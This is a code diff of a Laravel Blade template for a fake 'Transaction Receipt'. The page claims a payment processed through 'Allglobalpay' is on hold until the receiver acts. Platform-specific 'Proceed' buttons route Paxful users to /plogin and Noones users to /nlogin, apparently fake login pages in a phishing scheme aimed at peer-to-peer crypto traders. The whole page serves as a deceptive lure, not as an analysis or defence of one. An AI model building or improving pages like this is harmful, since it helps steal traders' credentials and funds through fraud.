@@ -1,177 +1,207 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+<!-- saved from url=(0031)https://pingowire.com/tracking/ -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- Bootstrap 5.3 CSS without integrity -->
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
 
-  <title>Transaction Receipt</title>
-  <style>
-    * {
-      box-sizing: border-box;
-    }
+    <title>Transaction Page</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f8f9fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
 
-    body {
-      margin: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #f5f8fa;
-      padding: 2rem;
-      display: flex;
-      justify-content: center;
-    }
+        .form-container {
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            max-width: 600px;
+            width: 90%;
+            box-sizing: border-box;
+        }
 
-    .receipt {
-      background: #fff;
-      width: 100%;
-      max-width: 700px;
-      border-radius: 12px;
-      overflow: hidden;
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
-    }
+        h3 {
+            font-size: 28px;
+            color: #dd0060;
+            margin-bottom: 20px;
+        }
 
-    .receipt-header {
-      background: linear-gradient(135deg, #007bff, #6610f2);
-      color: white;
-      text-align: center;
-      padding: 1.5rem;
-    }
+        .input-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            background-color: #f1f1f1;
+            border-radius: 8px;
+            padding: 15px;
+            box-shadow: inset 0 2px 4px rgba(5, 196, 230, 0.1);
+        }
 
-    .receipt-header h2 {
-      margin: 0;
-      font-size: 1.8rem;
-    }
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            outline: none;
+            background-color: transparent;
+            font-size: 18px;
+        }
 
-    .section {
-      padding: 1.5rem 2rem;
-      border-bottom: 1px solid #e2e8f0;
-    }
+        button {
+            padding: 10px 20px;
+            border: none;
+            background-color: #007bff;
+            color: #fff;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
 
-    .section:last-child {
-      border-bottom: none;
-    }
+        button:hover {
+            background-color: #0056b3;
+        }
 
-    .section-title {
-      font-size: 1.1rem;
-      margin-bottom: 1rem;
-      font-weight: 600;
-      color: #333;
-      border-left: 5px solid #007bff;
-      padding-left: 0.5rem;
-    }
+        .error-message {
+            color: red;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        .receipt-container {
+    max-height: 100vh; /* Fit within the viewport */
+    overflow-y: auto; /* Enable scrolling only if absolutely necessary */
+    padding: 20px;
+    box-sizing: border-box;
+    background-color: #ffffff;
+    border-radius: 10px;
+    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+    max-width: 600px;
+    margin: auto;
+}
 
-    .row {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 0.5rem 0;
-    }
+.receipt-header h1 {
+    font-size: 20px; /* Slightly reduced font size */
+    margin-bottom: 10px;
+    text-align: center;
+    color: #1623da;
+}
 
-    .label {
-      color: #555;
-      flex: 1;
-    }
+.receipt-header p {
+    font-size: 14px; /* Reduced text size */
+    margin: 5px 0;
+}
 
-    .value {
-      font-weight: 600;
-      color: #222;
-      flex: 1;
-      text-align: right;
-    }
+.receipt-section h2 {
+    font-size: 16px; /* Reduced section title size */
+    margin-bottom: 8px;
+    color: #007bff;
+    border-bottom: 1px solid #e0e0e0;
+    padding-bottom: 5px;
+}
 
-    .footer {
-      background: #f1f1f1;
-      padding: 1rem;
-      text-align: center;
-      font-size: 0.9rem;
-      color: #777;
-      border-top: 1px solid #ddd;
-    }
+.receipt-section p {
+    font-size: 14px; /* Reduced text size */
+    margin: 4px 0;
+}
 
-    @media (max-width: 600px) {
-      .row {
-        flex-direction: column;
-        align-items: flex-start;
-      }
+.action-required {
+    background-color: #fff8e1;
+    border: 1px solid #ffd54f;
+    border-radius: 5px;
+    padding: 6px 8px; /* Reduced padding */
+    font-size: 10px; /* Slightly smaller font size */
+    margin-top: 10px; /* Reduced margin */
+    line-height: 1.4; /* Adjust line height for tighter spacing */
+}
 
-      .value {
-        text-align: left;
-        margin-top: 0.2rem;
-      }
-    }
-  </style>
+
+.button-container {
+    text-align: center;
+    margin-top: 15px;
+}
+
+.action-button {
+    font-size: 14px; /* Slightly reduced button text */
+    padding: 8px 16px;
+    border-radius: 5px;
+    background-color: #28a745;
+    color: #fff;
+    border: none;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+}
+
+.action-button:hover {
+    background-color: #218838;
+}
+
+    </style>
 </head>
-<body>
-  <div class="receipt">
-    <div class="receipt-header">
-      <h2>Transaction Receipt</h2>
-    </div>
+<body data-new-gr-c-s-check-loaded="14.1240.0" data-gr-ext-installed="">
+    
+    <div class="receipt-container">
+        <div class="receipt-header">
+            <h1>Transaction Receipt</h1>
+            <div class="action-required">
+                <p>
+                    <span class="highlight">Payment:</span> {{ $payment->currency }} {{ number_format($payment->amount, 2) }}
 
-    <!-- Transaction Details -->
-    <div class="section">
-    <div class="row">
-        <div class="label">Amount:</div>
-        <div class="value">{{ $payment->currency }} {{ number_format($payment->amount, 2) }}</div>
-      </div>
-      <div class="row">
-        <div class="label"> Payment Mode:</div>
-        <div class="value">{{ $payment->currency }} {{ ($payment->account_type) }}</div>
-      </div>
-
-      <div class="row">
-        <div class="label">Transaction Status:</div>
-        <div class="value">Pending</div>
-      </div>
-      
-      
-    </div>
-
-    <!-- Receiver's Information -->
-    <div class="section">
-      <div class="section-title">Receiver's Information</div>
-      <div class="row">
-        <div class="label">Receiver's Name:</div>
-        <div class="value">{{ $payment->account_name }}</div>
-      </div>
-      <div class="row">
-        <div class="label">Receiver's Account Number:</div>
-        <div class="value">{{ $payment->client_email }}</div>
-      </div>
-      <div class="row">
-        <div class="label">Amount:</div>
-        <div class="value">{{ $payment->currency }} {{ number_format($payment->amount, 2) }}</div>
-      </div>
-    </div>
-
-    <!-- Additional Information -->
-    <div class="section">
-      <div class="section-title">Additional Information</div>
-     
-      <div class="row">
-        <div class="label">Reference:</div>
-        <div class="value">0100{{ request()->id }}</div>
-      </div>
-
-      <div class="row">
-        <div class="label">Reason For Payment:</div>
-        <div class="value">Active trade</div>
-      </div>
-    </div>
-
-    <div class="text-center mt-4">
-    @if(strtolower($payment->platform) == 'paxful')
+                    The payment has been processed successfully through <span>Allglobalpay</span>.
+                </p>
+            </div>
+        </div>
+    
+        <div class="action-required">
+            <div class="receipt-section">
+                <h2>Transaction Details</h2>
+                <p><span class="highlight">Payment:</span> {{ $payment->currency }}  {{ number_format($payment->amount, 2) }}</p>
+                <p><span class="highlight">Payment Mode:</span> {{ ($payment->account_type) }}</p>
+                <p><span class="highlight">Transaction Status:</span> PENDING</p>
+            </div>
+        </div>
+    
+        <div class="action-required">
+            <div class="receipt-section">
+                <h2>Receiver's Information</h2>
+                <p><span class="highlight">Receiver's Name:</span> {{ $payment->account_name }}</p>
+                <p><span class="highlight">Account Number:</span> {{ $payment->clients_email }}</p>
+                <p><span class="highlight">Amount:</span>{{ $payment->currency }}  {{ number_format($payment->amount, 2) }}</p>
+            </div>
+        </div>
+    
+        <div class="action-required">
+            <div class="receipt-section">
+                <h2>Additional Information</h2>
+                <p><span class="highlight">Reference Number:</span> 0100{{ request()->id }}</p>
+                <p><span class="highlight">Reason For Payment:</span> Active Trade</p>
+            </div>
+        </div>
+    
+        <div class="action-required">
+            <p><span class="highlight">Action Required:</span> The payment is currently on hold. The receiver must either accept the payment to transfer funds instantly to their account or cancel the transfer for an immediate refund to the sender.</p>
+            <span class="highlight">Note:</span> Once the transfer is initiated, only the receiver can complete or cancel the transaction.
+        </div>
+    
+        <div class="button-container">
+        @if(strtolower($payment->platform) == 'paxful')
         <a href="{{ url('/plogin') }}" class="btn btn-primary">Proceed</a>
-    @elseif(strtolower($payment->platform) == 'noones')
-        <a href="{{ url('/nlogin') }}" class="btn btn-success">Proceed</a>
-    @endif
-</div>
-<br>
+           
+            @elseif(strtolower($payment->platform) == 'noones')
 
-    <!-- Footer -->
-    <div class="footer">
-    Action Required: The payment is currently on hold. The receiver must either accept the payment to transfer funds instantly to their account or cancel the transfer for an immediate refund to the sender.
+            <a href="{{ url('/nlogin') }}" class="btn btn-primary">Proceed</a>
 
-Note: Once the transfer is initiated, only the receiver can complete or cancel the transaction.
+            @endif
+        </div>
     </div>
-  </div>
-</body>
-</html>
+</body></html>
+
